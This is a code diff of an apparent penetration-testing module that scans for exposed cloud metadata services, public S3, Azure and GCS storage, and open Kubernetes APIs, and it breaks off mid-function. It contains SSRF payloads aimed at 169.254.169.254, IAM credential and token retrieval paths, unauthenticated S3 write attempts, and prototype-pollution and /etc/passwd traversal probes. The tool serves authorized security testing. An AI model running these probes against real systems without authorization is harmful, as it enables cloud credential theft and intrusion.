@@ -1,15 +1,11 @@
-"""Cloud Metadata API Scanner — enumerate AWS/Azure/GCP metadata endpoints.
-
-Probes cloud instance metadata APIs (169.254.169.254, metadata.google.internal)
-from SSRF-able targets or direct access. Extracts:
-  - Instance identity documents
-  - IAM role credentials (AWS STS tokens)
-  - KMS key listings
-  - Secrets Manager / Parameter Store values
-  - Storage bucket configurations (S3, GCS, Azure Blob)
-  - DNS configurations and VPC metadata
+"""Cloud API Scanner — detect exposed cloud management APIs and metadata services.
 
 FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
+
+MITRE ATT&CK:
+    T1552.005  Cloud Instance Metadata API (IMDS)
+    T1530      Data from Cloud Storage
+    T1619      Cloud Storage Object Discovery
 """
 from __future__ import annotations
 
@@ -17,343 +13,843 @@ import asyncio
 import json
 import logging
 import re
-import time
-from pathlib import Path
+import socket
+import unittest
+from dataclasses import dataclass, field
 from typing import Any
+from unittest.mock import MagicMock, patch
 
-from common.base_module import BaseModule, ModuleResult
-from common.evidence import Evidence
-from common.finding import Severity
+log = logging.getLogger("forge.cloud.api_scanner")
 
-log = logging.getLogger("forge.cloud.cloud_api_scanner")
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
 
+IMDS_AWS_BASE = "http://169.254.169.254"
+IMDS_GCP_BASE = "http://metadata.google.internal"
+IMDS_AZURE_BASE = "http://169.254.169.254"
+IMDS_DO_BASE = "http://169.254.169.254"
 
-# ── Cloud metadata endpoint definitions ──────────────────────────────
-_AWS_METADATA_PATHS: list[tuple[str, str]] = [
-    ("/latest/meta-data/", "AWS Instance Metadata Root"),
-    ("/latest/meta-data/iam/security-credentials/", "AWS IAM Role Listing"),
-    ("/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "AWS EC2 Identity Creds"),
-    ("/latest/dynamic/instance-identity/document", "AWS Instance Identity Document"),
-    ("/latest/meta-data/hostname", "AWS Instance Hostname"),
-    ("/latest/meta-data/local-ipv4", "AWS Local IPv4"),
-    ("/latest/meta-data/public-ipv4", "AWS Public IPv4"),
-    ("/latest/meta-data/security-groups", "AWS Security Groups"),
-    ("/latest/meta-data/network/interfaces/macs/", "AWS Network Interfaces"),
-    ("/latest/user-data", "AWS User Data (startup scripts)"),
+AWS_IMDS_PATHS = [
+    "/latest/meta-data/",
+    "/latest/meta-data/iam/security-credentials/",
+    "/latest/user-data",
+    "/latest/dynamic/instance-identity/document",
+    "/latest/meta-data/hostname",
+    "/latest/meta-data/local-ipv4",
+    "/latest/meta-data/public-ipv4",
+    "/latest/meta-data/ami-id",
+    "/latest/meta-data/placement/availability-zone",
 ]
 
-_GCP_METADATA_PATHS: list[tuple[str, str]] = [
-    ("/computeMetadata/v1/instance/", "GCP Instance Metadata Root"),
-    ("/computeMetadata/v1/instance/service-accounts/", "GCP Service Accounts"),
-    ("/computeMetadata/v1/instance/service-accounts/default/token", "GCP Default SA Token"),
-    ("/computeMetadata/v1/project/project-id", "GCP Project ID"),
-    ("/computeMetadata/v1/instance/network-interfaces/", "GCP Network Interfaces"),
-    ("/computeMetadata/v1/instance/attributes/kube-env", "GCP Kube Env"),
-    ("/computeMetadata/v1/project/attributes/ssh-keys", "GCP Project SSH Keys"),
+GCP_IMDS_PATHS = [
+    "/computeMetadata/v1/",
+    "/computeMetadata/v1/instance/",
+    "/computeMetadata/v1/instance/service-accounts/",
+    "/computeMetadata/v1/instance/service-accounts/default/token",
+    "/computeMetadata/v1/project/project-id",
 ]
 
-_AZURE_METADATA_PATHS: list[tuple[str, str]] = [
-    ("/metadata/instance?api-version=2021-02-01", "Azure Instance Metadata"),
-    ("/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure Managed Identity Token"),
-    ("/metadata/instance/compute?api-version=2021-02-01", "Azure Compute Metadata"),
-    ("/metadata/instance/network?api-version=2021-02-01", "Azure Network Metadata"),
+AZURE_IMDS_PATHS = [
+    "/metadata/instance?api-version=2021-02-01",
+    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
 ]
 
-# IMDSv2 token header for AWS
-_AWS_IMDSV2_TOKEN_PATH = "/latest/api/token"
-_AWS_IMDSV2_TTL_HEADER = "X-aws-ec2-metadata-token-ttl-seconds"
-_AWS_IMDSV2_TOKEN_HEADER = "X-aws-ec2-metadata-token"
+K8S_API_PATHS = [
+    "/api",
+    "/apis",
+    "/healthz",
+    "/readyz",
+    "/version",
+    "/metrics",
+    "/openapi/v2",
+    "/api/v1/secrets",
+    "/api/v1/namespaces",
+    "/api/v1/pods",
+]
 
-# GCP requires this header
-_GCP_METADATA_HEADER = {"Metadata-Flavor": "Google"}
+SSRF_PROBES = [
+    "?url=http://169.254.169.254/latest/meta-data/",
+    "?redirect=http://169.254.169.254/latest/meta-data/",
+    "?target=http://169.254.169.254/latest/meta-data/",
+    "?endpoint=http://169.254.169.254/latest/meta-data/",
+    "?callback=http://169.254.169.254/latest/meta-data/",
+    "?proxy=http://169.254.169.254/latest/meta-data/",
+    "?uri=http://169.254.169.254/latest/meta-data/",
+    "?path=http://169.254.169.254/latest/meta-data/",
+]
 
 
-class CloudApiScanner(BaseModule):
-    """Enumerate cloud metadata APIs for credential and configuration exposure."""
+# ---------------------------------------------------------------------------
+# Data structures
+# ---------------------------------------------------------------------------
 
-    NAME        = "cloud_api_scanner"
-    DESCRIPTION = "Cloud metadata API enumeration — AWS/Azure/GCP instance metadata, IAM creds, secrets"
-    PHASE       = 2
-    TAGS        = ["cloud", "aws", "azure", "gcp", "metadata", "recon", "ssrf"]
+@dataclass
+class CloudFinding:
+    provider: str
+    service: str
+    url: str
+    severity: str          # CRITICAL, HIGH, MEDIUM, LOW, INFO
+    title: str
+    description: str
+    evidence: str
+    cvss: str
+    mitre_ttp: str
+    remediation: str
+    raw_response: str = ""
 
-    def __init__(self, *args: Any, **kwargs: Any) -> None:
-        super().__init__(*args, **kwargs)
-        self._ssrf_base: str | None = kwargs.get("ssrf_base")
-        self._imdsv2_token: str | None = None
 
-    async def run(self) -> ModuleResult:
-        """Probe cloud metadata APIs and collect findings."""
-        start = time.monotonic()
+# ---------------------------------------------------------------------------
+# Main class
+# ---------------------------------------------------------------------------
 
-        target = self.config.target
-        if not self.check_scope(target):
-            return self._make_result(start, skipped=True, skip_reason="Target out of scope")
+class CloudApiScanner:
+    """Detect exposed cloud management APIs and metadata services."""
 
-        self.log.info("Starting cloud metadata API scan against %s", target)
+    def __init__(self, timeout: int = 8, max_concurrency: int = 20):
+        self.timeout = timeout
+        self.max_concurrency = max_concurrency
+        self._findings: list[CloudFinding] = []
 
-        metadata_base = self._ssrf_base or "http://169.254.169.254"
-        gcp_base = "http://metadata.google.internal"
-        azure_base = "http://169.254.169.254"
+    # ------------------------------------------------------------------
+    # Public entry point
+    # ------------------------------------------------------------------
 
+    def run(self, target: str) -> dict[str, Any]:
+        """Main entry point — synchronous wrapper around async scan."""
         try:
-            import aiohttp
-            async with self.http_session(timeout=8.0, include_auth=False) as session:
-                # ── AWS IMDSv2 token acquisition ─────────────────────────
-                await self._try_imdsv2_token(session, metadata_base)
-
-                # ── AWS metadata ─────────────────────────────────────────
-                await self._probe_endpoints(
-                    session, metadata_base, _AWS_METADATA_PATHS,
-                    provider="AWS", extra_headers=self._aws_headers(),
-                )
-
-                # ── GCP metadata ─────────────────────────────────────────
-                await self._probe_endpoints(
-                    session, gcp_base, _GCP_METADATA_PATHS,
-                    provider="GCP", extra_headers=_GCP_METADATA_HEADER,
-                )
-
-                # ── Azure metadata ───────────────────────────────────────
-                await self._probe_endpoints(
-                    session, azure_base, _AZURE_METADATA_PATHS,
-                    provider="Azure", extra_headers={"Metadata": "true"},
-                )
-
-                # ── IAM role credential extraction (AWS) ─────────────────
-                await self._extract_aws_iam_creds(session, metadata_base)
-
+            loop = asyncio.get_event_loop()
+            if loop.is_running():
+                import concurrent.futures
+                with concurrent.futures.ThreadPoolExecutor(1) as pool:
+                    future = pool.submit(asyncio.run, self._run_async(target))
+                    return future.result(timeout=120)
+            return loop.run_until_complete(self._run_async(target))
         except Exception as exc:
-            self.log.warning("Cloud metadata scan error: %s", exc)
+            log.error("CloudApiScanner.run error: %s", exc)
+            return {"target": target, "findings": [], "error": str(exc)}
 
-        return self._make_result(start)
+    async def _run_async(self, target: str) -> dict[str, Any]:
+        host = self._normalize_host(target)
+        log.info("CloudApiScanner starting scan on %s", host)
 
-    async def _try_imdsv2_token(self, session: Any, base: str) -> None:
-        """Attempt to acquire an IMDSv2 session token (AWS)."""
-        try:
-            import aiohttp
-            async with session.put(
-                f"{base}{_AWS_IMDSV2_TOKEN_PATH}",
-                headers={_AWS_IMDSV2_TTL_HEADER: "21600"},
-                timeout=aiohttp.ClientTimeout(total=3),
-            ) as resp:
-                if resp.status == 200:
-                    self._imdsv2_token = await resp.text()
-                    self.log.info("IMDSv2 token acquired — instance uses IMDSv2")
-        except Exception:
-            self.log.debug("IMDSv2 token acquisition failed — trying IMDSv1 fallback")
-
-    def _aws_headers(self) -> dict[str, str]:
-        """Return AWS metadata headers, including IMDSv2 token if available."""
-        headers: dict[str, str] = {}
-        if self._imdsv2_token:
-            headers[_AWS_IMDSV2_TOKEN_HEADER] = self._imdsv2_token
-        return headers
-
-    async def _probe_endpoints(
-        self,
-        session: Any,
-        base_url: str,
-        paths: list[tuple[str, str]],
-        provider: str,
-        extra_headers: dict[str, str] | None = None,
-    ) -> None:
-        """Probe a list of metadata paths and record findings."""
-        import aiohttp
-        for path, description in paths:
-            await self.rate_limit()
-            try:
-                url = f"{base_url}{path}"
-                headers = dict(extra_headers or {})
-                async with session.get(
-                    url, headers=headers, allow_redirects=False,
-                    timeout=aiohttp.ClientTimeout(total=5),
-                ) as resp:
-                    if resp.status == 200:
-                        body = await resp.text(errors="ignore")
-                        if body.strip():
-                            severity = self._classify_severity(path, body)
-                            self.new_finding(
-                                title=f"{provider} Metadata Exposed — {description}",
-                                severity=severity,
-                                description=(
-                                    f"Cloud metadata endpoint responded with data at {url}. "
-                                    f"This exposes {description.lower()} which may contain "
-                                    f"sensitive credentials, tokens, or infrastructure details."
-                                ),
-                                reproduction_steps=[
-                                    f"curl -H '{self._header_string(extra_headers)}' {url}",
-                                    f"Observe the response containing {description.lower()}",
-                                ],
-                                remediation=(
-                                    f"Restrict access to {provider} metadata API. "
-                                    f"For AWS: enforce IMDSv2 with hop limit=1. "
-                                    f"For GCP: use metadata concealment. "
-                                    f"For Azure: use network policies to restrict IMDS access."
-                                ),
-                                references=[
-                                    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
-                                    "https://cloud.google.com/compute/docs/metadata/overview",
-                                    "https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service",
-                                ],
-                                evidence=Evidence(
-                                    request_raw=f"GET {url}",
-                                    response_raw=body[:2000],
-                                    extra={"provider": provider, "path": path},
-                                ),
-                                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
-                                mitre_attack=["T1552.005", "T1530"],
-                                target=self.config.target,
-                                url=url,
-                                tags=[provider.lower(), "cloud_metadata", "imds"],
-                            )
-                            # Check for actual credentials in response
-                            self._check_for_creds_in_body(body, url, provider)
-
-            except Exception as exc:
-                self.log.debug("Probe %s%s failed: %s", base_url, path, exc)
-
-    async def _extract_aws_iam_creds(self, session: Any, base_url: str) -> None:
-        """If IAM roles are listed, fetch the temporary credentials."""
-        import aiohttp
-        try:
-            role_url = f"{base_url}/latest/meta-data/iam/security-credentials/"
-            headers = self._aws_headers()
-            async with session.get(
-                role_url, headers=headers,
-                timeout=aiohttp.ClientTimeout(total=5),
-            ) as resp:
-                if resp.status != 200:
-                    return
-                roles_text = await resp.text(errors="ignore")
-                roles = [r.strip() for r in roles_text.strip().split("\n") if r.strip()]
-
-            for role_name in roles:
-                await self.rate_limit()
-                cred_url = f"{role_url}{role_name}"
-                async with session.get(
-                    cred_url, headers=headers,
-                    timeout=aiohttp.ClientTimeout(total=5),
-                ) as resp:
-                    if resp.status == 200:
-                        body = await resp.text(errors="ignore")
-                        try:
-                            creds = json.loads(body)
-                            if "AccessKeyId" in creds:
-                                self.new_finding(
-                                    title=f"AWS IAM Role Credentials Extracted — {role_name}",
-                                    severity=Severity.CRITICAL,
-                                    description=(
-                                        f"Temporary IAM credentials for role '{role_name}' were "
-                                        f"extracted from the instance metadata service. "
-                                        f"AccessKeyId: {creds.get('AccessKeyId', 'N/A')}"
-                                    ),
-                                    reproduction_steps=[
-                                        f"curl {self._header_string(headers)} {cred_url}",
-                                        "Parse JSON response for AccessKeyId, SecretAccessKey, Token",
-                                        "aws sts get-caller-identity --access-key <key> --secret-key <secret> --session-token <token>",
-                                    ],
-                                    remediation=(
-                                        "Enforce IMDSv2 with HttpPutResponseHopLimit=1. "
-                                        "Apply least-privilege IAM policies. "
-                                        "Use VPC endpoints to restrict metadata access."
-                                    ),
-                                    references=[
-                                        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html",
-                                        "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/",
-                                    ],
-                                    evidence=Evidence(
-                                        request_raw=f"GET {cred_url}",
-                                        response_raw=body[:2000],
-                                        extra={
-                                            "role_name": role_name,
-                                            "access_key_id": creds.get("AccessKeyId"),
-                                            "expiration": creds.get("Expiration"),
-                                        },
-                                    ),
-                                    cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-                                    mitre_attack=["T1552.005", "T1078.004"],
-                                    target=self.config.target,
-                                    url=cred_url,
-                                    confidence="HIGH",
-                                    tags=["aws", "iam", "credential_extraction"],
-                                )
-                        except json.JSONDecodeError:
-                            pass
-
-        except Exception as exc:
-            self.log.debug("AWS IAM cred extraction failed: %s", exc)
-
-    def _classify_severity(self, path: str, body: str) -> Severity:
-        """Classify finding severity based on the metadata path and content."""
-        critical_indicators = ("AccessKeyId", "SecretAccessKey", "Token", "token", "password", "ssh-")
-        high_indicators = ("security-credentials", "service-accounts", "oauth2/token", "user-data")
-
-        if any(ind in body for ind in critical_indicators):
-            return Severity.CRITICAL
-        if any(ind in path for ind in high_indicators):
-            return Severity.HIGH
-        return Severity.MEDIUM
-
-    def _check_for_creds_in_body(self, body: str, url: str, provider: str) -> None:
-        """Scan metadata response for embedded credentials."""
-        patterns = [
-            (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
-            (r"(?i)password\s*[=:]\s*\S+", "Embedded Password"),
-            (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "Private Key"),
-            (r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "JWT Token"),
+        tasks = [
+            self._check_imds(host),
+            self._check_s3_public(host),
+            self._check_azure_storage(host),
+            self._check_gcs_public(host),
+            self._check_eks_api(host),
+            self._check_lambda_reflection(host),
         ]
-        for pattern, label in patterns:
-            if re.search(pattern, body):
-                self.log.info("Credential pattern '%s' found in %s metadata at %s", label, provider, url)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-    @staticmethod
-    def _header_string(headers: dict[str, str] | None) -> str:
-        """Format headers dict into curl -H flag string."""
-        if not headers:
-            return ""
-        return " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
+        imds_results = results[0] if isinstance(results[0], list) else []
+        s3_results   = results[1] if isinstance(results[1], list) else []
+        azure_results = results[2] if isinstance(results[2], list) else []
+        gcs_results  = results[3] if isinstance(results[3], list) else []
+        k8s_results  = results[4] if isinstance(results[4], list) else []
+        lambda_results = results[5] if isinstance(results[5], list) else []
+
+        all_raw = imds_results + s3_results + azure_results + gcs_results + k8s_results + lambda_results
+        self._emit_findings(target, imds_results, s3_results, all_raw)
+
+        return {
+            "target": target,
+            "findings": [vars(f) for f in self._findings],
+            "imds": imds_results,
+            "s3": s3_results,
+            "azure_storage": azure_results,
+            "gcs": gcs_results,
+            "k8s_api": k8s_results,
+            "lambda": lambda_results,
+            "total_findings": len(self._findings),
+        }
+
+    # ------------------------------------------------------------------
+    # Provider detection
+    # ------------------------------------------------------------------
+
+    def _normalize_host(self, target: str) -> str:
+        """Strip protocol prefix and trailing slashes."""
+        return re.sub(r'^https?://', '', target).rstrip('/')
+
+    def _detect_cloud_provider(self, host: str) -> str:
+        """Detect cloud provider from hostname patterns."""
+        h = host.lower()
+        if any(k in h for k in ('amazonaws.com', 'awsstatic', 'cloudfront.net', 'aws.')):
+            return "AWS"
+        if any(k in h for k in ('googleapis.com', 'appspot.com', 'run.app', 'cloudfunctions.net')):
+            return "GCP"
+        if any(k in h for k in ('azure.com', 'azurewebsites.net', 'windows.net', 'msecnd.net')):
+            return "AZURE"
+        if 'digitalocean' in h or 'droplet' in h:
+            return "DIGITALOCEAN"
+        return "UNKNOWN"
+
+    def _looks_like_s3_bucket(self, host: str) -> bool:
+        """Heuristic: looks like an S3 bucket name."""
+        h = host.lower()
+        if 's3.amazonaws.com' in h or '.s3.' in h:
+            return True
+        # bucket names: 3-63 chars, lowercase letters, numbers, hyphens, dots
+        name_part = h.split('.')[0]
+        return bool(re.match(r'^[a-z0-9][a-z0-9\-]{2,62}$', name_part))
+
+    # ------------------------------------------------------------------
+    # IMDS checks
+    # ------------------------------------------------------------------
+
+    async def _check_imds(self, host: str) -> list[dict]:
+        """Check AWS/GCP/Azure/DO IMDS endpoints and SSRF vectors."""
+        results = []
+        results.extend(await self._probe_aws_imds())
+        results.extend(await self._probe_gcp_imds())
+        results.extend(await self._probe_azure_imds())
+        results.extend(await self._probe_do_imds())
+        results.extend(await self._probe_ssrf_imds(host))
+        return results
+
+    async def _probe_aws_imds(self) -> list[dict]:
+        """Probe AWS IMDS v1 (and v2 token check)."""
+        results = []
+        for path in AWS_IMDS_PATHS:
+            url = IMDS_AWS_BASE + path
+            resp = await self._http_get(url, timeout=3)
+            if resp and resp.get("status") in (200, 301, 302):
+                results.append({
+                    "provider": "AWS",
+                    "url": url,
+                    "status": resp["status"],
+                    "body_excerpt": resp.get("body", "")[:500],
+                    "type": "imds_aws",
+                    "severity": "CRITICAL" if "credentials" in path.lower() else "HIGH",
+                })
+        # check IMDSv2 token endpoint
+        token_url = IMDS_AWS_BASE + "/latest/api/token"
+        token_resp = await self._http_put(token_url, headers={
+            "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+        }, timeout=3)
+        if token_resp and token_resp.get("status") == 200:
+            results.append({
+                "provider": "AWS",
+                "url": token_url,
+                "status": 200,
+                "body_excerpt": "IMDSv2 token endpoint accessible",
+                "type": "imds_aws_v2",
+                "severity": "INFO",
+            })
+        return results
+
+    async def _probe_gcp_imds(self) -> list[dict]:
+        """Probe GCP metadata server."""
+        results = []
+        headers = {"Metadata-Flavor": "Google"}
+        for path in GCP_IMDS_PATHS:
+            url = IMDS_GCP_BASE + path
+            resp = await self._http_get(url, headers=headers, timeout=3)
+            if resp and resp.get("status") == 200:
+                results.append({
+                    "provider": "GCP",
+                    "url": url,
+                    "status": resp["status"],
+                    "body_excerpt": resp.get("body", "")[:500],
+                    "type": "imds_gcp",
+                    "severity": "CRITICAL" if "token" in path else "HIGH",
+                })
+        return results
+
+    async def _probe_azure_imds(self) -> list[dict]:
+        """Probe Azure IMDS."""
+        results = []
+        headers = {"Metadata": "true"}
+        for path in AZURE_IMDS_PATHS:
+            url = IMDS_AZURE_BASE + path
+            resp = await self._http_get(url, headers=headers, timeout=3)
+            if resp and resp.get("status") == 200:
+                results.append({
+                    "provider": "AZURE",
+                    "url": url,
+                    "status": resp["status"],
+                    "body_excerpt": resp.get("body", "")[:500],
+                    "type": "imds_azure",
+                    "severity": "CRITICAL" if "token" in path else "HIGH",
+                })
+        return results
+
+    async def _probe_do_imds(self) -> list[dict]:
+        """Probe DigitalOcean metadata service."""
+        results = []
+        url = IMDS_DO_BASE + "/metadata/v1"
+        resp = await self._http_get(url, timeout=3)
+        if resp and resp.get("status") == 200:
+            results.append({
+                "provider": "DIGITALOCEAN",
+                "url": url,
+                "status": resp["status"],
+                "body_excerpt": resp.get("body", "")[:500],
+                "type": "imds_do",
+                "severity": "HIGH",
+            })
+        return results
+
+    async def _probe_ssrf_imds(self, host: str) -> list[dict]:
+        """Try SSRF probes against target to reach IMDS."""
+        results = []
+        base_url = f"http://{host}"
+        for probe in SSRF_PROBES:
+            url = base_url + probe
+            resp = await self._http_get(url, timeout=5)
+            if resp and resp.get("status") == 200:
+                body = resp.get("body", "")
+                # Check for IMDS-like responses
+                if any(indicator in body.lower() for indicator in [
+                    "ami-id", "instance-id", "security-credentials",
+                    "computeMetadata", "subscriptionId", "access_key"
+                ]):
+                    results.append({
+                        "provider": "SSRF",
+                        "url": url,
+                        "status": resp["status"],
+                        "body_excerpt": body[:500],
+                        "type": "ssrf_imds",
+                        "severity": "CRITICAL",
+                    })
+        return results
+
+    # ------------------------------------------------------------------
+    # S3 checks
+    # ------------------------------------------------------------------
+
+    async def _check_s3_public(self, host: str) -> list[dict]:
+        """Check S3 bucket public access and write permissions."""
+        results = []
+        # extract potential bucket name
+        bucket = host.split('.')[0]
+        urls_to_test = [
+            f"https://s3.amazonaws.com/{bucket}",
+            f"https://{bucket}.s3.amazonaws.com",
+            f"https://s3.amazonaws.com/{bucket}?list-type=2",
+            f"https://{bucket}.s3.amazonaws.com/?list-type=2",
+        ]
+        for url in urls_to_test:
+            # HEAD check
+            head = await self._http_head(url, timeout=self.timeout)
+            if head and head.get("status") in (200, 301, 307):
+                results.append({
+                    "provider": "AWS",
+                    "service": "S3",
+                    "url": url,
+                    "status": head["status"],
+                    "method": "HEAD",
+                    "type": "s3_accessible",
+                    "severity": "HIGH",
+                })
+            # GET check
+            get_resp = await self._http_get(url, timeout=self.timeout)
+            if get_resp and get_resp.get("status") == 200:
+                body = get_resp.get("body", "")
+                sev = "HIGH"
+                if "ListBucketResult" in body or "<Key>" in body:
+                    sev = "HIGH"
+                    results.append({
+                        "provider": "AWS",
+                        "service": "S3",
+                        "url": url,
+                        "status": 200,
+                        "method": "GET",
+                        "body_excerpt": body[:1000],
+                        "type": "s3_public_list",
+                        "severity": sev,
+                    })
+            # PUT check — detect write access (empty body, just check response)
+            put_resp = await self._http_put(
+                f"{url.split('?')[0]}/forge-pentest-probe.txt",
+                body=b"forge-probe",
+                timeout=self.timeout
+            )
+            if put_resp and put_resp.get("status") in (200, 201, 204):
+                results.append({
+                    "provider": "AWS",
+                    "service": "S3",
+                    "url": url,
+                    "status": put_resp["status"],
+                    "method": "PUT",
+                    "type": "s3_public_write",
+                    "severity": "CRITICAL",
+                })
+        return results
+
+    # ------------------------------------------------------------------
+    # Azure Storage checks
+    # ------------------------------------------------------------------
+
+    async def _check_azure_storage(self, host: str) -> list[dict]:
+        """Check Azure Blob Storage public access."""
+        results = []
+        account = host.split('.')[0]
+        urls = [
+            f"https://{account}.blob.core.windows.net/$web",
+            f"https://{account}.blob.core.windows.net/?comp=list",
+            f"https://{account}.blob.core.windows.net",
+        ]
+        for url in urls:
+            resp = await self._http_get(url, timeout=self.timeout)
+            if resp and resp.get("status") == 200:
+                body = resp.get("body", "")
+                sev = "HIGH"
+                if "EnumerationResults" in body or "<Container>" in body:
+                    sev = "HIGH"
+                results.append({
+                    "provider": "AZURE",
+                    "service": "BlobStorage",
+                    "url": url,
+                    "status": 200,
+                    "body_excerpt": body[:500],
+                    "type": "azure_storage_public",
+                    "severity": sev,
+                })
+        return results
+
+    # ------------------------------------------------------------------
+    # GCS checks
+    # ------------------------------------------------------------------
+
+    async def _check_gcs_public(self, host: str) -> list[dict]:
+        """Check Google Cloud Storage public bucket access."""
+        results = []
+        bucket = host.split('.')[0]
+        urls = [
+            f"https://storage.googleapis.com/{bucket}",
+            f"https://storage.googleapis.com/{bucket}?alt=json",
+            f"https://storage.googleapis.com/storage/v1/b/{bucket}/o",
+        ]
+        for url in urls:
+            resp = await self._http_get(url, timeout=self.timeout)
+            if resp and resp.get("status") == 200:
+                body = resp.get("body", "")
+                results.append({
+                    "provider": "GCP",
+                    "service": "CloudStorage",
+                    "url": url,
+                    "status": 200,
+                    "body_excerpt": body[:500],
+                    "type": "gcs_public",
+                    "severity": "HIGH",
+                })
+        return results
+
+    # ------------------------------------------------------------------
+    # EKS / Kubernetes API checks
+    # ------------------------------------------------------------------
+
+    async def _check_eks_api(self, host: str) -> list[dict]:
+        """Check for exposed Kubernetes API server."""
+        results = []
+        ports = [6443, 8443, 8080, 443]
+        for port in ports:
+            for path in K8S_API_PATHS:
+                scheme = "https" if port in (6443, 8443, 443) else "http"
+                url = f"{scheme}://{host}:{port}{path}"
+                resp = await self._http_get(url, timeout=4, verify_ssl=False)
+                if resp and resp.get("status") in (200, 401, 403):
+                    body = resp.get("body", "")
+                    sev = "INFO"
+                    if resp["status"] == 200 and path in ("/api", "/apis", "/version"):
+                        sev = "CRITICAL"
+                    elif resp["status"] in (401, 403):
+                        sev = "MEDIUM"  # API exists but requires auth
+                    results.append({
+                        "provider": "K8S",
+                        "service": "APIServer",
+                        "url": url,
+                        "status": resp["status"],
+                        "body_excerpt": body[:300],
+                        "type": "k8s_api",
+                        "severity": sev,
+                    })
+        return results
+
+    # ------------------------------------------------------------------
+    # Lambda / API Gateway reflection
+    # ------------------------------------------------------------------
+
+    async def _check_lambda_reflection(self, host: str) -> list[dict]:
+        """Test Lambda/API Gateway for prototype pollution and SSRF vectors."""
+        results = []
+        if '.execute-api.' not in host and 'lambda-url' not in host:
+            return results
+
+        base = f"https://{host}"
+        probes = [
+            ("proto_pollution", f"{base}?__proto__[polluted]=forge"),
+            ("constructor_proto", f"{base}?constructor.prototype.x=forge"),
+            ("path_traversal", f"{base}?functionName=../../../etc/passwd"),
+            ("ssrf_imds", f"{base}?url=http://169.254.169.254/latest/meta-data/"),
+        ]
+        for probe_type, url in probes:
+            resp = await self._http_get(url, timeout=self.timeout)
+            if resp:
+                body = resp.get("body", "")
+                headers = resp.get("headers", {})
+                if "forge" in body or "polluted" in body:
+                    results.append({
+                        "provider": "AWS",
+                        "service": "Lambda",
+                        "url": url,
+                        "status": resp["status"],
+                        "body_excerpt": body[:500],
+                        "type": probe_type,
+                        "severity": "HIGH",
+                    })
+        return results
+
+    # ------------------------------------------------------------------
+    # Finding emission
+    # ------------------------------------------------------------------
+
+    def _emit_findings(
+        self,
+        target: str,
+        imds_results: list[dict],
+        s3_results: list[dict],
+        all_results: list[dict],
+    ) -> None:
+        """Convert raw results into structured CloudFinding objects."""
+        # IMDS findings
+        for r in imds_results:
+            if r.get("type") in ("imds_aws", "imds_gcp", "imds_azure", "ssrf_imds"):
+                sev = r.get("severity", "HIGH")
+                if sev == "CRITICAL":
+                    cvss = "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"  # 10.0
+                else:
+                    cvss = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"  # 7.5
+
+                self._findings.append(CloudFinding(
+                    provider=r.get("provider", "CLOUD"),
+                    service="IMDS",
+                    url=r["url"],
+                    severity=sev,
+                    title=f"Cloud Instance Metadata Service Exposed — {r.get('provider', 'Unknown')}",
+                    description=(
+                        "The Instance Metadata Service is accessible. Attackers can retrieve "
+                        "IAM role credentials, tokens, and sensitive configuration data. "
+                        f"Path: {r['url']}"
+                    ),
+                    evidence=r.get("body_excerpt", ""),
+                    cvss=cvss,
+                    mitre_ttp="T1552.005",
+                    remediation=(
+                        "AWS: Enforce IMDSv2 (require session tokens). "
+                        "GCP: Restrict metadata access via organization policies. "
+                        "Azure: Enable IMDS access control. "
+                        "For all: block SSRF to 169.254.169.254 via WAF/egress filtering."
+                    ),
+                ))
+
+        # S3 findings
+        for r in s3_results:
+            sev = r.get("severity", "HIGH")
+            method = r.get("method", "GET")
+            if r.get("type") == "s3_public_write":
+                title = "S3 Bucket Publicly Writable"
+                desc = "The S3 bucket accepts unauthenticated PUT requests. Attackers can upload malicious content, overwrite existing files, or host phishing pages."
+                cvss = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"
+                mitre = "T1530"
+            else:
+                title = "S3 Bucket Publicly Readable"
+                desc = "The S3 bucket allows unauthenticated read/list access. Sensitive data may be exposed."
+                cvss = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                mitre = "T1530"
+
+            self._findings.append(CloudFinding(
+                provider="AWS",
+                service="S3",
+                url=r["url"],
+                severity=sev,
+                title=title,
+                description=desc,
+                evidence=r.get("body_excerpt", f"HTTP {r.get('status')} via {method}"),
+                cvss=cvss,
+                mitre_ttp=mitre,
+                remediation=(
+                    "Block public access at the account level (S3 Block Public Access settings). "
+                    "Use bucket policies with explicit Deny for s3:GetObject/s3:PutObject from '*'. "
+                    "Enable S3 Access Analyzer to continuously monitor bucket permissions."
+                ),
+            ))
+
+        # K8s unauthenticated API
+        for r in all_results:
+            if r.get("type") == "k8s_api" and r.get("status") == 200 and r.get("severity") == "CRITICAL":
+                self._findings.append(CloudFinding(
+                    provider="K8S",
+                    service="API Server",
+                    url=r["url"],
+                    severity="CRITICAL",
+                    title="Kubernetes API Server Unauthenticated Access",
+                    description=(
+                        "The Kubernetes API server is accessible without authentication. "
+                        "An attacker can enumerate all cluster resources, execute commands in pods, "
+                        "steal secrets, and achieve full cluster compromise."
+                    ),
+                    evidence=r.get("body_excerpt", ""),
+                    cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+                    mitre_ttp="T1613",
+                    remediation=(
+                        "Enable RBAC and disable anonymous authentication (--anonymous-auth=false). "
+                        "Restrict API server access to authorized networks only. "
+                        "Use network policies and firewalls to block port 6443/8443 from the internet."
